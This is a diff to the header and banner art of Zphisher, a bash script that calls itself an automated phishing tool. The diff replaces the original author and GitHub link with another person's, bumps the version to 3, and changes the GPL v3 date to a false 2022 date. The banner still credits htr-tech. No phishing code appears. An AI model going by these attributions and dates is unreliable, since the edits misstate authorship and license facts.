@@ -1,9 +1,9 @@
 #!/bin/bash
 
 ##   Zphisher 	: 	Automated Phishing Tool
-##   Author 	: 	TAHMID RAYAT 
-##   Version 	: 	2.2
-##   Github 	: 	https://github.com/htr-tech
+##   Author 	: 	Mehdi Kilidari 
+##   Version 	: 	3
+##   Github 	: 	https://github.com/Mahdiklidari
 
 ##   THANKS TO :
 ##   Aditya Shakya - https://github.com/adi1090x
@@ -22,7 +22,7 @@
 
 
 ##                   GNU GENERAL PUBLIC LICENSE
-##                    Version 3, 29 June 2007
+##                    Version 3, 29 June 2022
 ##
 ##    Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
 ##    Everyone is permitted to copy and distribute verbatim copies
@@ -91,7 +91,7 @@
 ##    The precise terms and conditions for copying, distribution and
 ##    modification follow.
 ##
-##      Copyright (C) 2022  HTR-TECH (https://github.com/htr-tech)
+##      Copyright (C) 2022  HTR-TECH (https://github.com/Mahdiklidari)
 ##
 
 
@@ -155,13 +155,13 @@ banner() {
 	cat <<- EOF
 		${ORANGE}
 		${ORANGE} ______      _     _     _               
-		${ORANGE}|___  /     | |   (_)   | |              
-		${ORANGE}   / / _ __ | |__  _ ___| |__   ___ _ __ 
-		${ORANGE}  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
-		${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |   
-		${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|   
+		${ORANGE}|___  /     | |   (_)   | |                   ____        ____      |1|  /6/
+		${ORANGE}   / / _ __ | |__  _ ___| |__   ___ _ __     /4/\5\      /3/\4\     |2| /5/
+		${ORANGE}  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|   /3/  \6\    /2/  \5\    |4|/4/
+		${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |     /2/    \7\  /1/    \6\   |5|\3\
+		${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|    /1/      \8\/9/      \7\  |6| \2\
 		${ORANGE}      | |                                
-		${ORANGE}      |_|                ${RED}Version : 2.2
+		${ORANGE}      |_|                ${RED}Version : 3
 
 		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by htr-tech (tahmid.rayat)${WHITE}
 	EOF
@@ -171,9 +171,9 @@ banner() {
 banner_small() {
 	cat <<- EOF
 		${BLUE}
-		${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
-		${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
-		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} 2.2
+		${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄  ░▄▄░░░░▄▄░    ░█  ░▄░
+		${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄ ░▄▄░░▄░▄░▄▄░   ░█▄▄
+		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀ ░▄▄░ ░▄░ ░▄▄░  ░█  ░▄░  ${WHITE} 3
 	EOF
 }
 
